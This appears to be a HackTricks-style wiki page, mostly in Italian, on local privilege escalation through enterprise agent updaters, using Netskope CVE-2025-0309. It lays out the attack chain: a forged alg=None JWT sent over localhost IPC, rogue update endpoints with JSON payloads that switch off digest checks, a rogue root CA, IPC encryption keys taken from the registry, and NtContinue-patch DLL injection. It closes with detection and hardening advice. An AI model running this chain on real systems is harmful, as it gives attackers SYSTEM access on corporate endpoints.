# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di local privilege escalation su Windows trovate in endpoint agent aziendali e updater che espongono una superficie IPC a basso attrito e un flusso di update privilegiato. Un esempio rappresentativo è Netskope Client for Windows < R129 (CVE-2025-0309), dove un utente con pochi privilegi può costringere l'enrollment verso un server controllato dall'attaccante e poi consegnare un MSI malevolo che il servizio SYSTEM installa.

Idee chiave riutilizzabili contro prodotti simili:
- Abusare dell'IPC localhost di un servizio privilegiato per forzare la ri-iscrizione o la riconfigurazione verso un server controllato dall'attaccante.
- Implementare gli endpoint di update del vendor, fornire una Trusted Root CA rogue, e puntare l'updater verso un pacchetto "signed" malevolo.
- Evadere controlli di signer deboli (CN allow‑lists), flag di digest opzionali, e proprietà MSI permissive.
- Se l'IPC è "encrypted", derivare la key/IV da identificatori macchina leggibili da tutti memorizzati nel registry.
- Se il servizio restringe i caller per image path/process name, inject in un processo allow‑listed o spawnarne uno suspended e bootstrap la tua DLL tramite una minimale thread‑context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Molti agenti distribuiscono un processo UI in user‑mode che comunica con un servizio SYSTEM via localhost TCP usando JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso dell'exploit:
1) Creare un token JWT di enrollment i cui claim controllano l'host backend (es., AddonUrl). Usare alg=None in modo che non sia richiesta una firma.
2) Inviare il messaggio IPC che invoca il comando di provisioning con il tuo JWT e il nome tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il servizio inizia a contattare il tuo rogue server per enrollment/config, ad es.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Se la verifica del caller è basata su path/name‑based, origina la richiesta da un allow‑listed vendor binary (vedi §4).

---
## 2) Dirottare il canale di aggiornamento per eseguire codice come SYSTEM

Una volta che il client comunica col tuo server, implementa gli endpoint attesi e indirizzalo verso un MSI dell'attaccante. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una config JSON con un intervallo di aggiornamento molto breve, ad es.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA in formato PEM. Il service lo installa nello store Local Machine Trusted Root.
3) /v2/checkupdate → Fornisce metadata che puntano a un MSI maligno e a una versione fasulla.

Bypassare controlli comuni osservati in the wild:
- Signer CN allow‑list: il service potrebbe controllare solo che il Subject CN sia “netSkope Inc” o “Netskope, Inc.”. La tua CA rogue può emettere un leaf con quel CN e firmare l'MSI.
- CERT_DIGEST property: includi una property MSI innocua chiamata CERT_DIGEST. Nessuna enforcement all'installazione.
- Optional digest enforcement: flag di config (es., check_msi_digest=false) disabilita validazioni crittografiche aggiuntive.

Risultato: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Da R127, Netskope ha incapsulato l'IPC JSON in un campo encryptData che sembra Base64. Il reverse engineering ha mostrato AES con key/IV derivate da valori di registry leggibili da qualsiasi utente:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la cifratura e inviare comandi cifrati validi da un utente standard. Suggerimento generale: se un agent improvvisamente “critta” la sua IPC, cerca device IDs, product GUIDs, install IDs sotto HKLM come material.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Alcuni servizi provano ad autenticare il peer risolvendo il PID della connessione TCP e confrontando il percorso/nome dell'immagine contro binari vendor nella allow‑list sotto Program Files (es., stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo presente nella allow‑list (es., nsdiag.exe) e proxy dell'IPC dall'interno.
- Avviare un binario della allow‑list in stato suspended e bootstrap della tua proxy DLL senza CreateRemoteThread (vedi §5) per soddisfare le regole di tamper imposte dal driver.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

I prodotti spesso imbarcano un minifilter/OB callbacks driver (es., Stadrv) che rimuove diritti pericolosi dagli handle verso processi protetti:
- Process: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user‑mode affidabile che rispetta questi vincoli:
1) CreateProcess di un binario vendor con CREATE_SUSPENDED.
2) Ottenere gli handle ancora permessi: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo, e un handle thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME se patchi codice a un RIP noto).
3) Sovrascrivere ntdll!NtContinue (o un altro thunk mappato precocemente e garantito) con una piccola stub che chiama LoadLibraryW sul percorso della tua DLL, poi salta indietro.
4) ResumeThread per triggerare la stub in‑process, caricando la tua DLL.

Poiché non hai mai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (l'hai creato tu), la policy del driver è soddisfatta.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizza una rogue CA, la signing di MSI maligni e serve gli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope è un custom IPC client che costruisce messaggi IPC arbitrari (opzionalmente AES‑encrypted) e include l'injection via suspended‑process per originare da un binario nella allow‑list.

---
## 7) Detection opportunities (blue team)
- Monitorare aggiunte al Local Machine Trusted Root. Sysmon + registry‑mod eventing (vedi guidance di SpecterOps) funziona bene.
- Segnalare esecuzioni MSI avviate dal service dell'agent da percorsi come C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Revisionare i log dell'agent per host/tenant di enrollment inattesi, es.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – cercare addonUrl / anomalie tenant e provisioning msg 148.
- Allertare su client IPC localhost che non siano i binari firmati attesi, o che originano da alberi di processo figlio inconsueti.

---
## Hardening tips for vendors
- Vincolare enrollment/update hosts a una allow‑list rigorosa; rifiutare domini non trusted nel clientcode.
- Autenticare i peer IPC con primitive OS (ALPC security, named‑pipe SIDs) invece di controlli su image path/name.
- Tenere materiale segreto fuori da HKLM leggibile da tutti; se l'IPC deve essere cifrato, derivare le chiavi da secret protetti o negoziare su channel autenticati.
- Trattare l'updater come una superficie di supply‑chain: richiedere una catena completa verso una CA trusted che controlli, verificare le firme dei pacchetti contro chiavi pinned, e fail closed se la validazione è disabilitata in config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
